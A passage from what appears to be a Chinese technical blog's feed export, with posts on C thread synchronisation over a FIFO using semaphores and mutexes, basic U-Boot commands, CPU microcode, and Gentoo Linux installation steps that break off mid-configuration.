class="hljs-comment">//消费则线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    sem_wait(&amp;full);<br>    sem_wait(&amp;mutex);<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> buffer[stringlen];<br>    bzero(buffer, stringlen);<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        ret = read(fd, buffer, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo:%s\n&quot;</span>, buffer);<br>        bzero(buffer, stringlen);<br>        i++;<br>        sleep(<span class="hljs-number">1</span>);<br>        sem_post(&amp;avail);<br>        sem_post(&amp;mutex);<br>    &#125;<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">if</span> (F_OK == access(fifo, <span class="hljs-number">0</span>)) &#123;<br>        unlink(fifo);<br>    &#125;<br>    ret = mkfifo(fifo, <span class="hljs-number">0666</span>);<br>    fd = open(fifo, O_RDWR);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;mkfifo&quot;</span>);<br>    &#125;<br>    ret = sem_init(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + sem_init(&amp;avail, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) + sem_init(&amp;mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;semphore init failed!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">pthread_t</span> threadid[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//创建两个线程</span><br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, producer, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, consumer, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">//等待两个线程结束</span><br>    pthread_join(threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>);<br>    pthread_join(threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-使用线程互斥锁实现线程同步"><a href="#2-使用线程互斥锁实现线程同步" class="headerlink" title="2.使用线程互斥锁实现线程同步"></a>2.使用线程互斥锁实现线程同步</h3><h4 id="使用的api-1"><a href="#使用的api-1" class="headerlink" title="使用的api"></a>使用的api</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_mutex_t</span> 线程互斥锁类型<br>pthread_mutex_lock(<span class="hljs-type">pthread_mutex_t</span> *mutex);<br>pthread_mutex_unlock(<span class="hljs-type">pthread_mutex_t</span> *mutex);<br></code></pre></td></tr></table></figure><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-comment">//定义两个宏,一个用于表示fifo文件的路径,一个用于表示向fifo文件中写入的字符串</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fifo <span class="hljs-string">&quot;/tmp/myfifo&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> string <span class="hljs-string">&quot;myhelloworld&quot;</span></span><br><br><span class="hljs-type">int</span> fd = <span class="hljs-number">-1</span>;<br><span class="hljs-type">pthread_mutex_t</span> mutex;<br><br><span class="hljs-comment">//生产者线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">p_operation</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        <span class="hljs-comment">//获得线程锁</span><br>        pthread_mutex_lock(&amp;mutex);<br>        ret = write(fd, <span class="hljs-built_in">string</span>, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file successful!\n&quot;</span>);<br><span class="hljs-comment">//释放线程锁</span><br>        pthread_mutex_unlock(&amp;mutex);<br>        sleep(<span class="hljs-number">1</span>);<br>        i++;<br>    &#125;<br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">//消费则线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">v_operation</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> buffer[stringlen];<br>    bzero(buffer, stringlen);<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        pthread_mutex_lock(&amp;mutex);<br>        <span class="hljs-comment">//获得线程互斥锁</span><br>        ret = read(fd, buffer, stringlen);<br>        <span class="hljs-keyword">if</span> (ret == stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo:%s\n&quot;</span>, buffer);<br>            bzero(buffer, stringlen);<br>            i++;<br>        &#125;<br>        pthread_mutex_unlock(&amp;mutex);<br>        <span class="hljs-comment">//释放线程互斥锁</span><br>    &#125;<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">if</span> (F_OK == access(fifo, <span class="hljs-number">0</span>)) &#123;<br>        unlink(fifo);<br>    &#125;<br>    ret = mkfifo(fifo, <span class="hljs-number">0666</span>);<br>    fd = open(fifo, O_RDWR);<br>    <span class="hljs-comment">//将文件描述符设为非阻塞，防止出现死锁(如果没有设置非阻塞,可能会出现一个线程等待数据的到来,而另一个线程在等待线程锁的释放,造成死锁)</span><br>    <span class="hljs-type">int</span> flag = fcntl(fd, F_GETFL);<br>    fcntl(fd, F_SETFL, flag | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;mkfifo&quot;</span>);<br>    &#125;<br>    pthread_mutex_init(&amp;mutex, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">pthread_t</span> threadid[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//创建两个线程</span><br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, p_operation, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, v_operation, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">//等待两个线程结束</span><br>    pthread_join(threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>);<br>    pthread_join(threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//销毁线程锁</span><br>    pthread_mutex_destroy(&amp;mutex);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uboot基本命令</title>
    <link href="/2022/04/11/uboot%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/04/11/uboot%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="uboot基本命令"><a href="#uboot基本命令" class="headerlink" title="uboot基本命令"></a>uboot基本命令</h1><h2 id="什么是uboot？"><a href="#什么是uboot？" class="headerlink" title="什么是uboot？"></a>什么是uboot？</h2><p>uboot一个嵌入式领域常用的一种bootloader,支持多种计算机架构,如ARM,PPC,MIPS,</p><h2 id="为什么用uboot"><a href="#为什么用uboot" class="headerlink" title="为什么用uboot?"></a>为什么用uboot?</h2><ul><li>1.开放源码</li><li>2.支持多种嵌入式操作系统内核，如Linux、NetBSD, VxWorks, QNX, RTEMS, ARTOS, LynxOS, android</li><li>3.支持多个处理器系列，如PowerPC、ARM、x86、MIPS</li><li>4.较高的可靠性和稳定性</li><li>5.高度灵活的功能设置,适合U-Boot调试、操作系统不同引导要求、产品发布等</li><li>6.丰富的设备驱动源码，如串口、以太网、SDRAM、FLASH、LCD、NVRAM、EEPROM、RTC、键盘等</li><li>7.较为丰富的开发调试文档与强大的网络技术支持</li></ul><h2 id="uboot常用命令"><a href="#uboot常用命令" class="headerlink" title="uboot常用命令"></a>uboot常用命令</h2><h4 id="1-修改或查看内存命令"><a href="#1-修改或查看内存命令" class="headerlink" title="1.修改或查看内存命令"></a>1.修改或查看内存命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.md[.b,.w,.l] address count(查看内存中的数据)<br>2.nm[.b,.w,.l] address(修改内存中的值)<br>3.mm[.b,.w,.l] address(修改内存中的值,并且他会自增,输入q会退出)<br>4.mw[.b,.w,.l] address value [count](修改内存中的值)<br>5.<span class="hljs-built_in">cp</span>[.b,.w,.l] srcaddress value [count](拷贝内存中的值)<br>6.cmp[.b,.w,.l] addr1 addr2 count(对比两块内存中的值)<br></code></pre></td></tr></table></figure><h4 id="2-读取命令"><a href="#2-读取命令" class="headerlink" title="2.读取命令"></a>2.读取命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.fatinfo &lt;interface&gt; dev:part (显示分区信息)<br>2.fatls &lt;interface&gt; dev:part directory(列出某个目录的文件或者是目录)<br>3.fatload &lt;interface&gt; address dev:part file (将一个文件从磁盘分区读取到内存)<br>以上命令都是针对于fat文件系统分区的操作<br></code></pre></td></tr></table></figure><h4 id="3-设置环境变量"><a href="#3-设置环境变量" class="headerlink" title="3.设置环境变量"></a>3.设置环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printenv</span>(显示当前环境变量)<br>setenv name value(设置环境变量)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>嵌入式开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置和使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>什么是microcode?</title>
    <link href="/2022/04/10/%E4%BB%80%E4%B9%88%E6%98%AFmicrocode/"/>
    <url>/2022/04/10/%E4%BB%80%E4%B9%88%E6%98%AFmicrocode/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是microcode"><a href="#什么是microcode" class="headerlink" title="什么是microcode?"></a>什么是microcode?</h1><h4 id="cpu执行指令的步骤一般为"><a href="#cpu执行指令的步骤一般为" class="headerlink" title="cpu执行指令的步骤一般为"></a>cpu执行指令的步骤一般为</h4><ul><li>1.取指令</li><li>2.指令译码</li><li>3.指令执行</li><li>4.结果写回</li></ul><p>由上述步骤我们知道,cpu在执行二进制代码的时候需要对指令进行译码才能够执行  </p><h3 id="cpu译码的开始"><a href="#cpu译码的开始" class="headerlink" title="cpu译码的开始"></a>cpu译码的开始</h3><p>在译码开始时,程序的指令和数据分别会放到一级指令缓存(L1 cache),和数据一级缓存中,(只有L1 cache才是唯一指令和数据单独分割的cache),然后指令一级缓存中的指令会进入解码器,然后才是指令执行的开始</p><h3 id="cpu如何认识并指令指令"><a href="#cpu如何认识并指令指令" class="headerlink" title="cpu如何认识并指令指令"></a>cpu如何认识并指令指令</h3><h4 id="cpu译码器-Instuction-Decode-Unit-IDU"><a href="#cpu译码器-Instuction-Decode-Unit-IDU" class="headerlink" title="cpu译码器(Instuction Decode Unit(IDU))"></a>cpu译码器(Instuction Decode Unit(IDU))</h4><p>cpu译码器一般分为两种</p><ul><li>1.硬件指令译码器</li><li>2.微码指令译码器</li></ul><p>现在我们使用的计算机一般是X86架构,属于CISC(复杂指令集),指令种类繁多,如果所有的解码都通过硬件来完成,将会大幅增加硬件布线的难度,因此一般cpu在设计的时候一般只会对一些少量基本的指令采用硬件解码的方式,而一些复杂的指令采用微码指令译码器将其拆解为多条精简指令(microcode),因此cpu只有microcode才是基本的执行单位,硬件解码完成后,将会被cpu调度器(scheduler)放入pipeline提高指令的并行性</p><h3 id="microcode如何修复"><a href="#microcode如何修复" class="headerlink" title="microcode如何修复"></a>microcode如何修复</h3><p>我们知道,一条复杂指令要通过microcode译码器分解为多条microcode才能够被cpu所执行,原始的microcode来自于一块rom,为了microcode,新设计了一块较小的SRAM,用来为该rom上的microcode打补丁Microcode更新通常通过更新BIOS来更新</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gentoolinux安装步骤</title>
    <link href="/2022/04/10/Gentoolinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/10/Gentoolinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Gentoolinux安装步骤"><a href="#Gentoolinux安装步骤" class="headerlink" title="Gentoolinux安装步骤"></a>Gentoolinux安装步骤</h1><h2 id="1-基本文件的获取"><a href="#1-基本文件的获取" class="headerlink" title="1.基本文件的获取"></a>1.基本文件的获取</h2><ul><li>1.获取livecd<br>livecd可以使用Gentoo官方提供的livecd或者其他livecd</li><li>2.获取stage<br>stage3分为两种,一种是以systemd作为init程序,一种是以openrc做为init程序(Gentoo官方是推荐openrc)</li></ul><h2 id="2-光盘刻录"><a href="#2-光盘刻录" class="headerlink" title="2.光盘刻录"></a>2.光盘刻录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#linux用户可以使用dd</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/***.iso of=/dev/sda<br></code></pre></td></tr></table></figure><h2 id="3-磁盘分区和挂载"><a href="#3-磁盘分区和挂载" class="headerlink" title="3.磁盘分区和挂载"></a>3.磁盘分区和挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#磁盘分区</span><br>fdisk /dev/sda<br><br><span class="hljs-comment">#磁盘格式化</span><br><br><span class="hljs-comment">#boot分区</span><br>mkfs.vfat /dev/sda1<br><br><span class="hljs-comment">#swap分区(如果内存足够可以不使用swap)</span><br>mkswap /dev/sda2<br><br><span class="hljs-comment">#根分区</span><br>mkfs.ext4 /dev/sda3<br><br><span class="hljs-comment">#分区挂载</span><br><span class="hljs-built_in">mkdir</span> /mnt/gentoo<br>mount /dev/sda2 /mnt/gentoo<br></code></pre></td></tr></table></figure><h2 id="4-解压stage包"><a href="#4-解压stage包" class="headerlink" title="4.解压stage包"></a>4.解压stage包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取Gentoo stage3包</span><br>wget https://bouncer.gentoo.org/fetch/root/all/releases/amd64/autobuilds/20220109T170538Z/stage3-amd64-systemd-20220109T170538Z.tar.xz<br>tar -Jxf stage3-amd64-systemd-20220109T170538Z.tar.xz -C /mnt/gentoo<br><br><span class="hljs-comment">#将之前格式化的boot磁盘挂载</span><br>mount /dev/sda1 /mnt/gentoo/boot<br></code></pre></td></tr></table></figure><h2 id="5-安装环境配置"><a href="#5-安装环境配置" class="headerlink" title="5.安装环境配置"></a>5.安装环境配置</h2><h3 id="5-1-挂载必要的文件系统"><a href="#5-1-挂载必要的文件系统" class="headerlink" title="5.1.挂载必要的文件系统"></a>5.1.挂载必要的文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置dns解析文件</span><br><span class="hljs-built_in">cp</span> --dereference /etc/resolv.conf /mnt/gentoo/etc/resolv.conf<br><br>mount --types proc /proc /mnt/gentoo/proc<br>mount --rbind /sys /mnt/gentoo/sys<br>mount --make-rslave /mnt/gentoo/sys<br>mount --rbind /dev /mnt/gentoo/dev<br>mount --make-rslave /mnt/gentoo/dev<br><span class="hljs-comment">#假如用的不是gentoo的livecd,需要加入以下</span><br><span class="hljs-built_in">test</span> -L /dev/shm &amp;&amp; <span class="hljs-built_in">rm</span> /dev/shm &amp;&amp; <span class="hljs-built_in">mkdir</span> /dev/shm<br>mount --types tmpfs --options nosuid,nodev,noexec shm /dev/shm<br><br><span class="hljs-built_in">chmod</span> 1777 /dev/shm<br></code></pre></td></tr></table></figure><h3 id="5-2-进入到新的系统进行基本系统配置"><a href="#5-2-进入到新的系统进行基本系统配置" class="headerlink" title="5.2.进入到新的系统进行基本系统配置"></a>5.2.进入到新的系统进行基本系统配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chroot</span> /mnt/gentoo /bin/bash<br><span class="hljs-built_in">source</span> /etc/profile<br><span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot)<span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span><br><br><span class="hljs-comment">#生成fstab文件</span><br>blkid<br><span class="hljs-comment">#如果使用的archlinux的livecd,可以使用archlinux的genfstab自动生成fstab文件</span><br><span class="hljs-comment">#genfstab /mnt/gentoo &gt; /mnt/gentoo/etc/fstab</span><br><br><span class="hljs-comment">#建议使用uuid</span><br>blkid &gt;&gt; /etc/fstab<br>修改/etc/fstab文件<br>UUID=<span class="hljs-string">&quot;203C-2BDD&quot;</span>        /boot   vfat    defaults 0 1<br>UUID=<span class="hljs-string">&quot;5afdfbc9-0c66-4a13-8f29-da00199af5de&quot;</span> /   ext4 defaults defaults,noatime,discard 0 2<br><br><span class="hljs-comment">#设置hostname</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Gentoo&quot;</span> &gt; /etc/hostname<br>nano /etc/hosts<br><br><span class="hljs-comment">#定义的是现在系统</span><br>127.0.0.1       tux.homenetwork tux localhost<br>::1             tux.homenetwork tux localhost<br><br><span class="hljs-comment">#定义你网络上的其它系统</span><br>192.168.0.5   jenny.homenetwork jenny<br>192.168.0.6   benny.homenetwork benny<br><br><span class="hljs-comment">#设置时区</span><br><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br>nano /etc/locale.gen<br><br>en_US.UTF-8 UTF-8<br>zh_CN.UTF-8 UTF-8<br><br>locale-gen<br><br><span class="hljs-comment">#自动设置区域</span><br><span class="hljs-comment">#列出可选择的区域</span><br>eselect locale list<br><br><span class="hljs-comment">#设置系统的区域</span><br>eselect locale <span class="hljs-built_in">set</span> ?<br><span class="hljs-comment">#手动设置区域</span><br>nano /etc/locale.conf<br>LANG=<span class="hljs-string">&quot;en_US.UTF-8&quot;</span><br><br></code></pre></td></tr></table></figure><h3 id="5-3-配置portage包管理器源"><a href="#5-3-配置portage包管理器源" class="headerlink" title="5.3.配置portage包管理器源"></a>5.3.配置portage包管理器源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">nano /mnt/gentoo/etc/portage/make.conf<br><br><span class="hljs-comment"># These settings were set by the catalyst build script that automatically</span><br><span class="hljs-comment"># built this stage.</span><br><span class="hljs-comment"># Please consult /usr/share/portage/config/make.conf.example for a more</span><br><span class="hljs-comment"># detailed example.</span><br>COMMON_FLAGS=<span class="hljs-string">&quot;-march=native -O3 -pipe -fstack-protector-strong&quot;</span> <span class="hljs-comment">#设置编译参数(-march-native可以根据cpu指令集进行优化,-O3优化级别)</span><br><br>CFLAGS=<span class="hljs-string">&quot;<span 